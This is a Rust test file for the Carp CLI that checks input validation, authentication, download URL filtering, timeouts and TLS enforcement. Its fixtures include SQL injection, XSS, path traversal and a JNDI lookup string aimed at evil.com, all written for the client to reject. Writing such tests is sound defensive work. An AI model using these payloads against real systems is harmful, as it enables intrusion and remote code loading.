/// Security-focused tests for the Carp CLI
/// Tests input validation, authentication, and security features
use carp_cli::api::ApiClient;
use carp_cli::config::{Config, RetrySettings, SecuritySettings};
use carp_cli::utils::error::{CarpError, CarpResult};
use std::env;
use tokio::time::{timeout, Duration};

/// Security test configuration
pub struct SecurityTestConfig {
    pub api_base_url: String,
    pub test_timeout: Duration,
    pub skip_network_tests: bool,
}

impl Default for SecurityTestConfig {
    fn default() -> Self {
        Self {
            api_base_url: env::var("CARP_TEST_API_URL")
                .unwrap_or_else(|_| "https://api.carp.refcell.org".to_string()),
            test_timeout: Duration::from_secs(30),
            skip_network_tests: env::var("CARP_SKIP_NETWORK_TESTS").is_ok(),
        }
    }
}

/// Create a test configuration with security-focused settings
fn create_security_test_config() -> Config {
    let test_config = SecurityTestConfig::default();

    Config {
        registry_url: test_config.api_base_url,
        api_key: None,   // Test without api key for security validation
        api_token: None, // Test without token for security validation
        timeout: 5,      // Shorter timeout for security tests
        verify_ssl: true,
        default_output_dir: Some("./security_test_output".to_string()),
        max_concurrent_downloads: 1, // Limited for security testing
        retry: RetrySettings {
            max_retries: 1, // Minimal retries for security tests
            initial_delay_ms: 50,
            max_delay_ms: 200,
            backoff_multiplier: 1.0,
        },
        security: SecuritySettings {
            max_download_size: 1024 * 1024, // 1MB limit for security tests
            max_publish_size: 512 * 1024,   // 512KB limit for security tests
            allow_http: false,              // Always enforce HTTPS
            token_warning_hours: 1,
        },
    }
}

/// Test input validation for search queries
#[tokio::test]
async fn test_search_input_validation() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    // Test cases for malicious or invalid inputs
    let long_query = "a".repeat(10000);
    let invalid_inputs = vec![
        ("", "Empty query should be rejected"),
        ("   ", "Whitespace-only query should be rejected"),
        ("\0", "Null byte should be rejected"),
        (
            long_query.as_str(),
            "Extremely long query should be rejected",
        ),
        (
            "'; DROP TABLE agents; --",
            "SQL injection attempt should be rejected",
        ),
        (
            "<script>alert('xss')</script>",
            "XSS attempt should be rejected",
        ),
        (
            "../../../etc/passwd",
            "Path traversal attempt should be rejected",
        ),
        (
            "${jndi:ldap://evil.com/a}",
            "JNDI injection attempt should be rejected",
        ),
    ];

    for (input, description) in invalid_inputs {
        let result = client.search(input, Some(1), false).await;
        match result {
            Err(CarpError::InvalidAgent(_)) => {
                println!("✓ Correctly rejected: {}", description);
            }
            Ok(_) => {
                // If the API accepts it, that's also valid behavior
                // as long as it's properly sanitized server-side
                println!("✓ API accepted (should sanitize): {}", description);
            }
            Err(e) => {
                println!("✓ Rejected with error ({}): {}", e, description);
            }
        }
    }

    Ok(())
}

/// Test agent name validation
#[tokio::test]
async fn test_agent_name_validation() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    let long_name = "a".repeat(101);
    let invalid_names = vec![
        ("", "Empty name"),
        ("   ", "Whitespace name"),
        ("../etc/passwd", "Path traversal"),
        ("con", "Windows reserved name"),
        ("name with spaces", "Spaces in name"),
        ("name@invalid", "Invalid characters"),
        (long_name.as_str(), "Name too long"),
        ("name\0with\0nulls", "Null bytes"),
        ("name\nwith\nnewlines", "Newlines"),
        ("-name", "Starting with dash"),
        ("name-", "Ending with dash"),
        ("Name", "Uppercase letters"),
        ("123name", "Starting with number"),
    ];

    for (name, description) in invalid_names {
        let result = client.get_agent_download(name, None).await;
        assert!(
            result.is_err(),
            "Invalid name '{}' should be rejected: {}",
            name,
            description
        );
        println!("✓ Correctly rejected invalid name: {}", description);
    }

    Ok(())
}

/// Test version validation
#[tokio::test]
async fn test_version_validation() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    let long_version = "v".repeat(101);
    let invalid_versions = vec![
        ("", "Empty version"),
        ("   ", "Whitespace version"),
        ("../etc/passwd", "Path traversal"),
        (long_version.as_str(), "Version too long"),
        ("1.0.0\0", "Null byte in version"),
        ("1.0.0\n", "Newline in version"),
        ("1.0.0 OR 1=1", "SQL injection attempt"),
        ("${jndi:ldap://evil.com/a}", "JNDI injection"),
        ("1.0.0<script>", "XSS attempt"),
    ];

    for (version, description) in invalid_versions {
        let result = client.get_agent_download("test-agent", Some(version)).await;
        assert!(
            result.is_err(),
            "Invalid version '{}' should be rejected: {}",
            version,
            description
        );
        println!("✓ Correctly rejected invalid version: {}", description);
    }

    Ok(())
}

/// Test URL validation for downloads
#[tokio::test]
async fn test_download_url_validation() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    let malicious_urls = vec![
        ("", "Empty URL"),
        ("not-a-url", "Invalid URL format"),
        ("http://example.com/file.zip", "HTTP URL (should be HTTPS)"),
        ("ftp://example.com/file.zip", "FTP protocol"),
        ("file:///etc/passwd", "File protocol"),
        ("javascript:alert('xss')", "JavaScript protocol"),
        ("data:text/html,<script>alert(1)</script>", "Data URL"),
        ("https://localhost/file.zip", "Localhost URL"),
        ("https://127.0.0.1/file.zip", "IP address URL"),
        ("https://[::1]/file.zip", "IPv6 localhost"),
        ("https://example.com:22/file.zip", "SSH port"),
        (
            "https://internal.corporate.local/file.zip",
            "Internal domain",
        ),
    ];

    for (url, description) in malicious_urls {
        let result = client.download_agent(url).await;
        assert!(
            result.is_err(),
            "Malicious URL '{}' should be rejected: {}",
            url,
            description
        );
        println!("✓ Correctly rejected malicious URL: {}", description);
    }

    Ok(())
}

/// Test authentication bypass attempts
#[tokio::test]
async fn test_authentication_bypass_attempts() -> CarpResult<()> {
    if SecurityTestConfig::default().skip_network_tests {
        println!("Skipping authentication tests (CARP_SKIP_NETWORK_TESTS set)");
        return Ok(());
    }

    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    let bypass_attempts = vec![
        ("", "", "Empty credentials"),
        ("admin", "admin", "Default credentials"),
        ("admin", "", "Admin with empty password"),
        ("", "password", "Empty username"),
        ("' OR '1'='1", "password", "SQL injection in username"),
        ("admin", "' OR '1'='1", "SQL injection in password"),
        ("admin\0", "password", "Null byte in username"),
        ("admin", "password\0", "Null byte in password"),
        ("../../admin", "password", "Path traversal in username"),
        (
            "admin",
            "${jndi:ldap://evil.com/a}",
            "JNDI injection in password",
        ),
    ];

    for (username, password, description) in bypass_attempts {
        let result = client.authenticate(username, password).await;
        // Authentication should either fail or succeed based on valid credentials
        // The key is that it shouldn't cause server errors or bypasses
        match result {
            Ok(_) => println!("⚠ Authentication succeeded (unexpected): {}", description),
            Err(CarpError::Auth(_)) => {
                println!("✓ Authentication properly failed: {}", description)
            }
            Err(e) => println!(
                "✓ Authentication failed with error: {} - {}",
                e, description
            ),
        }
    }

    Ok(())
}

/// Test configuration security
#[tokio::test]
async fn test_configuration_security() -> CarpResult<()> {
    // Test that security settings are properly enforced
    let mut config = create_security_test_config();

    // Test invalid registry URL
    config.registry_url = "".to_string();
    let result = ApiClient::new(&config);
    assert!(result.is_err(), "Empty registry URL should be rejected");

    // Test HTTP URL when HTTPS is required
    config.registry_url = "http://example.com".to_string();
    config.security.allow_http = false;
    // Note: URL protocol validation might be done at request time

    // Test extremely large timeouts
    config.timeout = u64::MAX;
    let client = ApiClient::new(&config);
    // Should handle gracefully without panicking
    assert!(client.is_ok(), "Large timeout should be handled gracefully");

    println!("✓ Configuration security tests passed");
    Ok(())
}

/// Test concurrent request limits and rate limiting
#[tokio::test]
async fn test_concurrent_request_security() -> CarpResult<()> {
    if SecurityTestConfig::default().skip_network_tests {
        println!("Skipping concurrent request tests (CARP_SKIP_NETWORK_TESTS set)");
        return Ok(());
    }

    let config = create_security_test_config();
    let _client = ApiClient::new(&config)?;

    // Test rapid concurrent requests (potential DoS attempt)
    let mut futures = Vec::new();
    for i in 0..20 {
        let client_clone = ApiClient::new(&config)?;
        let future = async move {
            let result = client_clone.health_check().await;
            println!("Request {} result: {:?}", i, result.is_ok());
            result
        };
        futures.push(future);
    }

    let results = futures::future::join_all(futures).await;
    let success_count = results.iter().filter(|r| r.is_ok()).count();

    // Some requests should succeed, but the system should handle the load
    println!(
        "Concurrent requests: {}/{} succeeded",
        success_count,
        results.len()
    );
    assert!(
        success_count > 0,
        "At least some concurrent requests should succeed"
    );

    Ok(())
}

/// Test memory exhaustion protection
#[tokio::test]
async fn test_memory_exhaustion_protection() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    // Test search with large limit (potential memory exhaustion)
    let result = client.search("test", Some(usize::MAX), false).await;
    match result {
        Err(_) => println!("✓ Large limit properly rejected"),
        Ok(response) => {
            // If accepted, check that response is reasonable
            assert!(
                response.agents.len() < 10000,
                "Response should be limited to reasonable size"
            );
            println!(
                "✓ Large limit handled with reasonable response size: {}",
                response.agents.len()
            );
        }
    }

    Ok(())
}

/// Test error message information disclosure
#[tokio::test]
async fn test_error_message_security() -> CarpResult<()> {
    let config = create_security_test_config();
    let client = ApiClient::new(&config)?;

    // Test that error messages don't disclose sensitive information
    let result = client
        .get_agent_download("nonexistent-agent-12345", None)
        .await;
    match result {
        Err(e) => {
            let error_msg = e.to_string();
            // Check that error doesn't contain sensitive paths or internal details
            assert!(
                !error_msg.contains("/etc/"),
                "Error should not contain system paths"
            );
            assert!(
                !error_msg.contains("C:\\"),
                "Error should not contain Windows paths"
            );
            assert!(
                !error_msg.contains("password"),
                "Error should not contain credentials"
            );
            assert!(
                !error_msg.contains("token"),
                "Error should not contain tokens"
            );
            assert!(
                !error_msg.contains("database connection"),
                "Error should not contain database details"
            );
            println!("✓ Error message is appropriately sanitized: {}", error_msg);
        }
        Ok(_) => {
            // Unexpected success - this might indicate a problem
            println!("⚠ Nonexistent agent request unexpectedly succeeded");
        }
    }

    Ok(())
}

/// Test timeout enforcement
#[tokio::test]
async fn test_timeout_enforcement() -> CarpResult<()> {
    let mut config = create_security_test_config();
    config.timeout = 1; // Very short timeout
    let client = ApiClient::new(&config)?;

    // This might timeout or succeed quickly depending on network conditions
    let start = std::time::Instant::now();
    let result = timeout(Duration::from_secs(5), client.health_check()).await;
    let duration = start.elapsed();

    match result {
        Ok(Ok(_)) => println!("✓ Request completed quickly: {:?}", duration),
        Ok(Err(_)) => println!("✓ Request failed (possibly due to timeout): {:?}", duration),
        Err(_) => println!("✓ Test timeout enforced: {:?}", duration),
    }

    // The key is that it shouldn't hang indefinitely
    assert!(
        duration < Duration::from_secs(10),
        "Request should not hang indefinitely"
    );

    Ok(())
}

/// Test SSL/TLS security
#[tokio::test]
async fn test_ssl_security() -> CarpResult<()> {
    if SecurityTestConfig::default().skip_network_tests {
        println!("Skipping SSL tests (CARP_SKIP_NETWORK_TESTS set)");
        return Ok(());
    }

    let mut config = create_security_test_config();
    config.verify_ssl = true;
    config.registry_url = "https://self-signed.badssl.com".to_string(); // Known bad cert

    let client = ApiClient::new(&config)?;
    let result = client.health_check().await;

    // Should fail due to SSL verification
    match result {
        Err(e) => {
            let error_msg = e.to_string();
            if error_msg.contains("certificate")
                || error_msg.contains("ssl")
                || error_msg.contains("tls")
            {
                println!("✓ SSL verification properly enforced");
            } else {
                println!("✓ Request failed (may be due to SSL): {}", error_msg);
            }
        }
        Ok(_) => {
            println!("⚠ SSL verification may not be working as expected");
        }
    }

    Ok(())
}
